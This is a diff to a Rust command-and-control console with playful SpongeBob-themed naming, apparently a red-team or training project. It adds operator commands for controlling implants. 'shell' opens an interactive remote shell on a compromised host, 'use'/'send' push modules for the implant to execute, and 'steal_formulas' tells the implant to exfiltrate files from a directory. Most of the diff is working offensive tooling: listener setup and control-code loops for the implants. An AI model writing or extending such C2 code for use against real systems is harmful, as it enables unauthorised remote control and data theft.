@@ -21,12 +21,13 @@ use std::mem::drop;
 use std::env::{self, current_dir};
 use std::path::Path;
 
+mod usr_mods;
+
 extern crate directories;
 use directories::UserDirs;
 
 extern crate rustyline;
 use rustyline::{history, hint, completion, highlight, line_buffer};
-
 
 fn main() {
     // clear console first
@@ -35,16 +36,18 @@ fn main() {
     banner();
 
     //Vec<(ID, PORT, PROTOCOL, )>
-    let mut listen_tracker: Vec<(u64, u16, String/* , Arc<Mutex<SharedBuffer>>, u16*/)> = Vec::new();
+    let mut listen_tracker: Vec<(u64, u16, String)> = Vec::new();
+    let mut anchovy_list: Vec<(Vec<(u64, u16, String)>, Arc<Mutex<SharedBuffer>>)> = Vec::new();
     let mut relay_port = 2000;
     let mut sb_arc = Arc::new(Mutex::new(SharedBuffer {
         cc: 0,
         buff: [0; 2048].to_vec(),
     }));
     //Defaults
-    let mut protocol: u16 = 1;
+    let mut protocol: u16 = 2;
     let mut listen_port: u16 = 2120;
     let mut local_address = SocketAddr::from(([127, 0, 0, 1], listen_port));
+    let mut curr_module = String::new();
     // main program loop
     loop {
         // print the prompt and read in a command
@@ -144,6 +147,31 @@ fn main() {
                 println!("\x1b[33m[+] Executing command\x1b[0m");
                 info!("[+] Executing command");
             }
+            else if current_cmd.contains("shell"){
+                println!("[+] Entering shell");
+                sb_arc = Arc::clone(&shell(sb_arc.clone()));
+            }
+            else if current_cmd.eq("mod"){
+                usr_mods::list_mods();
+            }
+            else if current_cmd.contains("use"){
+                let mut command = current_cmd.split(' ');
+                command.next();
+                let module = command.next().unwrap().trim();
+                curr_module = module.to_owned();
+                println!("Module set to: {:?}", curr_module);
+            }
+            else if current_cmd.eq("send"){
+                if curr_module.len() > 1{
+                    sb_arc = Arc::clone(&send_module(sb_arc.clone(), curr_module.as_str()));
+                }
+                else{
+                    println!("Select a valid module!");
+                }
+            }
+            else if current_cmd.eq("steal_formulas"){
+                sb_arc = Arc::clone(&steal_formulas(sb_arc.clone()));
+            }
             else if current_cmd.contains("set") {
                 // look for all commands that contain set
                 let mut command = current_cmd.split(' ');
@@ -171,17 +199,16 @@ fn main() {
                                 Err(e) => println!("\x1b[33mThose are the wrong ingredients!\x1b[0m"),
                             }
                         }
-                        else if option.eq("protocol"){
-                            match value{
-                                "udp" => {protocol = 1;  
-                                    println!("\x1b[33m[+] Setting default listener protocol to {}\x1b[0m", "udp");},
-                                "tcp" => {protocol = 2;
-                                    println!("\x1b[33m[+] Setting default listener protocol to {}\x1b[0m", "tcp");},
-                                "http" => println!("\x1b[31mWe didn't finish making your crabby patty yet!\x1b[0m"),
-                                "dns" => println!("\x1b[31mWe didn't finish making your crabby patty yet!\x1b[0m"),
-                                &_ => println!("\x1b[31mThose are the wrong ingredients!\x1b[0m"),
-                            
-                            }
+                    }
+                    else if option.eq("protocol"){
+                        match value{
+                            "udp" | "UDP" => {protocol = 1;  
+                                println!("\x1b[33m[+] Setting default listener protocol to {}\x1b[0m", "UDP");},
+                            "tcp" | "TCP" => {protocol = 2;
+                                println!("\x1b[33m[+] Setting default listener protocol to {}\x1b[0m", "TCP");},
+                            "http" | "HTTP" => println!("\x1b[31mWe didn't finish making your crabby patty yet!\x1b[0m"),
+                            "dns" | "DNS" => println!("\x1b[31mWe didn't finish making your crabby patty yet!\x1b[0m"),
+                            &_ => println!("\x1b[31mThose are the wrong ingredients!\x1b[0m"),
                         }
                     }
                     else if curr.eq("payload"){
@@ -300,15 +327,10 @@ fn create_anchovy() {
 
 
 // open listener
-fn open_crusty_crab(tracker: &mut Vec<(u64, u16, String)>, relay_port: u16, address: SocketAddr, prot_type: u16) -> Arc<Mutex<SharedBuffer>>{
-    // let mut local: String = "127.0.0.1:".to_owned();
-    // local.push_str(&relay_port.to_string()[..]);
-    // let relay = UdpSocket::bind(local).unwrap();
-    // tracker.push(((tracker.len() as u64) + 1, relay_port, relay));
-    
-    
+fn open_crusty_crab(listeners: &mut Vec<(u64, u16, String)>, relay_port: u16, address: SocketAddr, prot_type: u16) -> Arc<Mutex<SharedBuffer>>{
+
     //Create a new listener
-    let mut new_listen = new_lsn(tracker.len() as u64);
+    let mut new_listen = new_lsn(listeners.len() as u64);
     let mut protocol = "udp";
     if prot_type == 1{
         protocol = "udp";
@@ -317,7 +339,7 @@ fn open_crusty_crab(tracker: &mut Vec<(u64, u16, String)>, relay_port: u16, addr
     else if prot_type == 2{
         protocol = "tcp";
     }
-    tracker.push(((tracker.len() as u64) + 1, relay_port, protocol.to_string()));
+    listeners.push(((listeners.len() as u64) + 1, relay_port, protocol.to_string()));
     
     //Create the shared buff and clone 
     let mut sb: Arc<Mutex<SharedBuffer>> = Arc::new(Mutex::new(SharedBuffer {
@@ -334,5 +356,152 @@ fn open_crusty_crab(tracker: &mut Vec<(u64, u16, String)>, relay_port: u16, addr
     );
     thread::sleep(time::Duration::from_millis(10));
     return sb_arc;
+
+}
+
+
+// Creates interactive shell with implant
+// Exit shell with "exit" or "Exit"
+fn shell(sb: Arc<Mutex<SharedBuffer>>) -> Arc<Mutex<SharedBuffer>>{
+    let mut code: u8 = 5;
+    if true {
+        let mut buffer = sb.lock().unwrap();
+        buffer.cc = code;
+    }
+
+    let mut swap = true;
+    let mut exit_flag = false;
+    // now we interact
+    print!("anchovy_shell $ ");
+    io::stdout().flush().unwrap();
+    let mut memo: String = String::new();
+    loop {
+        if swap {
+            //Exit command was given
+            if exit_flag{
+                let mut buffer = sb.lock().unwrap();
+                buffer.cc = 101;
+                break;
+            }
+            io::stdout().flush().unwrap();
+            // read from stdin
+            io::stdin().read_line(&mut memo);
+            // check if we need to execute a module
+            // write command to shared buffer
+            let mut buffer = sb.lock().unwrap();
+            buffer.buff = memo.as_bytes().to_vec();
+            swap = false;
+        }
+        else {
+            let mut buffer = sb.lock().unwrap();
+            if  String::from_utf8_lossy(&buffer.buff[..]).contains("Exiting Shell"){
+                io::stdout().flush().unwrap();
+                swap = true;
+                exit_flag = true;
+            }
+            else if !String::from_utf8_lossy(&buffer.buff[..]).contains(memo.as_str()) {
+                print!("{}\nanchovy_shell $ ", String::from_utf8_lossy(&buffer.buff[..]));
+                io::stdout().flush().unwrap();
+                memo = String::new();
+                swap = true;
+            }
+        }
+
+        // wait until shared buffer changes
+        // print changed shared buffer
+        thread::sleep(time::Duration::from_millis(10));
+    }
+    
+    return sb;
+    
+}
+
+
+// Sends command for implant to execute module 
+fn send_module(sb: Arc<Mutex<SharedBuffer>>, module: &str) -> Arc<Mutex<SharedBuffer>>{
+    let mut code: u8 = 6;
+    if true {
+        let mut buffer = sb.lock().unwrap();
+        buffer.cc = code;
+    }
+    let mut memo: String = module.to_string();
+    let mut swap = true;
+    loop {
+        if swap {
+            io::stdout().flush().unwrap();
+            memo = module.to_string();
+            // write to shared buffer
+            let mut buffer = sb.lock().unwrap();
+            buffer.cc = 6;
+            buffer.buff = memo.as_bytes().to_vec();
+            swap = false;
+        }
+        else {
+            let mut buffer = sb.lock().unwrap();
+            if !String::from_utf8_lossy(&buffer.buff[..]).contains(memo.as_str()) {
+                let mut write_string = String::from_utf8_lossy(&buffer.buff[..]);
+                println!("{}", String::from_utf8_lossy(&buffer.buff[..]));
+                io::stdout().flush().unwrap();
+                memo = String::new();
+                break;
+            }
+        }
+        thread::sleep(time::Duration::from_millis(10));
+    }
+
+    // 101 code keeps implant connected
+    // but goes back to main loop
+    let mut code: u8 = 101;
+    if true {
+        let mut buffer = sb.lock().unwrap();
+        buffer.cc = code;
+    }
+    return sb;
+}
+
+
+// Exfil files in .secret_formulas dir
+// Modules should check if dir is already created, if not create dir 
+// Similar code to shell/module (no read in "if swap")
+fn steal_formulas(sb: Arc<Mutex<SharedBuffer>>) -> Arc<Mutex<SharedBuffer>>{
+
+    let mut code: u8 = 7;
+    if true {
+        let mut buffer = sb.lock().unwrap();
+        buffer.cc = code;
+    }
+    let mut memo: String = String::new();
+    let mut swap = true;
+    loop {
+        if swap {
+            io::stdout().flush().unwrap();
+            // write to shared buffer
+            let mut buffer = sb.lock().unwrap();
+            buffer.cc = 7;
+            buffer.buff = memo.as_bytes().to_vec();
+            swap = false;
+        }
+        else {
+            let mut buffer = sb.lock().unwrap();
+            if !String::from_utf8_lossy(&buffer.buff[..]).contains(memo.as_str()) {
+                let mut write_string = String::from_utf8_lossy(&buffer.buff[..]);
+                println!("{}", String::from_utf8_lossy(&buffer.buff[..]));
+                io::stdout().flush().unwrap();
+                memo = String::new();
+                break;
+            }
+            break;
+        }
+        thread::sleep(time::Duration::from_millis(10));
+    }
+    
+    // 101 code keeps implant connected
+    // but goes back to main loop
+    let mut code: u8 = 101;
+    if true {
+        let mut buffer = sb.lock().unwrap();
+        buffer.cc = code;
+    }
+    return sb;
 
 }
